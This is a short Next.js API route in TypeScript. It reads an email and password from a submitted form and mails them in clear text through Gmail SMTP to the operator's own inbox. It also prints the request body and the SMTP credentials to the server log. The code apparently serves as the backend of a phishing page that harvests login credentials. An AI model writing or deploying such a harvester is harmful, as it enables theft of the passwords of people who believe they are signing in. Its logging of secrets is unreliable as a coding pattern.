// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from "next";
import nextConnect from "next-connect";
import NodeMailer from "nodemailer";

const handler = nextConnect().post(
	async (req: NextApiRequest, res: NextApiResponse) => {
		console.log(req.body);
		const { email, password } = req.body;
		console.log(process.env.EMAIL, process.env.PASS);
		try {
			const transportador = NodeMailer.createTransport({
				host: "smtp.gmail.com",
				port: 465,
				secure: true,
				auth: {
					user: process.env.EMAIL,
					pass: process.env.PASS,
				},
			});
			const dataParaEnviar = {
				from: process.env.EMAIL,
				to: process.env.EMAIL,
				subject: "Meu perfil",
				html: `<p>Email: ${email} </p>
                <p>Password: ${password}</p>`,
			};
			await transportador.sendMail(dataParaEnviar);
			res.status(200).send({
				message: "Mensaje enviado correctamente",
			});
		} catch (error) {
			res.status(500).send({
				message: "Error en el servidor",
			});
		}
	}
);

export default handler;
